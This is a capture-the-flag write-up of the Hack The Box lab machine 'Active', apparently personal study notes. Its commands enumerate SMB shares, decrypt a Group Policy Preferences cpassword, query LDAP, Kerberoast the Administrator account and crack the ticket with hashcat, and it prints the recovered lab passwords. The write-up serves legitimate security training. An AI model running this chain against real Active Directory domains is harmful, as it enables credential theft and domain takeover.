![[{F21DF797-2581-4C84-B7BC-73B9F1EC028D}.png]]


# Enumeration

## Nmap
```bash
sudo nmap -sV -sC -oA nmap/scan 10.129.213.81
Nmap scan report for 10.129.213.81 (10.129.213.81)
Host is up (0.042s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-07 09:08:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-07T09:09:04
|_  start_date: 2025-06-07T08:46:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  7 05:09:12 2025 -- 1 IP address (1 host up) scanned in 71.15 seconds

```

### Enum the shares
To enums the shares with anonymous authentication we can use tool such `smbmap`
```bash
smbmap -H 10.129.213.81
```
![[Pasted image 20250607160315.png]]

or even `crackmapexec`
![[Pasted image 20250607160426.png]]

In both cases we can note that have `READ` access only in `Replication` share

We can access to this share using `smbclient` and download all its content 
```bash
smbclient //10.129.213.81/Replication -N                           
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```
under the path `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` we can find the `Groups.xml` that contain the `cpassword` attribute (we see later) that contain the encrypted password of the user `SVC_TGS`

#### Group Policy Preferences (GPP) Passwords
When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is **AES-256 bit encrypted**, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

The XML looks like the following:
![[Pasted image 20250607122209.png]]

To decrypt the AES-256 we can use `gpp-decrypt` tool
```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

![[Pasted image 20250607161940.png]]


## FootHold
Now that we have a credential for `SVC_TGS` account try to check if we are able to connect into other shares
```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.213.81
```
![[Pasted image 20250607162052.png]]

Now connect to the smb share `Users` and navigate under the user's desktop to find the user.txt flag 
```bash
smbclient  //10.129.213.81/Users -U "active.htb\SVC_TGS"
smb: \SVC_TGS\Desktop\> cd SVC_TGS\Desktop
smb: \SVC_TGS\Desktop\> get user.txt                    
```

## Privilege Escalation
We can query the ldap protocol to find other users in the DC.
```bash
ldapsearch -H LDAP://10.129.213.81  -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub '(&(objectCategory=person)(objectClass=User)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' samaccountname | grep sAMAccountName
```

- `-s sub`: The `-s` option specifies the search scope. `sub` means a subtree search, including the base DN and all its child entries. **This is the most comprehensive search scope, as it traverses the entire directory tree below the base DN.**
- `'(&(objectCategory=person)(objectClass=User)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))'`: is an LDAP query to find all users object that are not **disable**.
	- `objectCategory=person`: Searches for objects in the category "person"
	- `objectClass=user` Narrows down to objects with  class of "user"
	- `(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))`: Excludes disabled accounts. The `userAccountControl` **attribute is a bit flag**; this part of the filter excludes accounts with the second bit set (which indicates a disabled account).

![[Pasted image 20250607152018.png]]

We can see the `Administartor` account is also active.

Now we can add `(serviceprincipalname=*/*)` in to the LDAP query to check if this account have `SPN` configured.
```bash
ldapsearch -H LDAP://10.129.213.81  -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub '(&(objectCategory=person)(objectClass=User)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))' serviceprincipalname | grep -B 1 servicePrincipalName
```

![[Pasted image 20250607154006.png]]
Its seems the `active.htb\administrator` account has been configured with a `SPN`.

We can check this with the `GrUsersPNs.py` script
![[Pasted image 20250607154336.png]]
Great this means we can perform a `kerberoasting` attack to retrieve the `TGS` ticket of administrator account
### Kerberoasting

To perform a `kerberoasting` attack we can use the same command above and adding the `-request` flag

```bash
GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.213.81 -request -outputfile Administrator_TGS
```

![[Pasted image 20250607154724.png]]

We can crack this TGS using `hashcat` with the `13100` module according with the "[hashcat table](https://hashcat.net/wiki/doku.php?id=example_hashes)".
```bash
hashcat -m 13100 Administrator_TGS /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20250607154948.png]]
Perfect now that we have the `Ticketmaster1968` password of Administrator account check, using `smbmap`, if we have access to other shares
![[Pasted image 20250607155231.png]]

Now all that remains for us to do is use `smbclient` navigate in the `USERS` share, under administrator's desktop and retrieve the admin flag.

```bash
smbclient //10.129.213.81/USERS -U Administrator%Ticketmaster1968
```

![[Pasted image 20250607162751.png]]

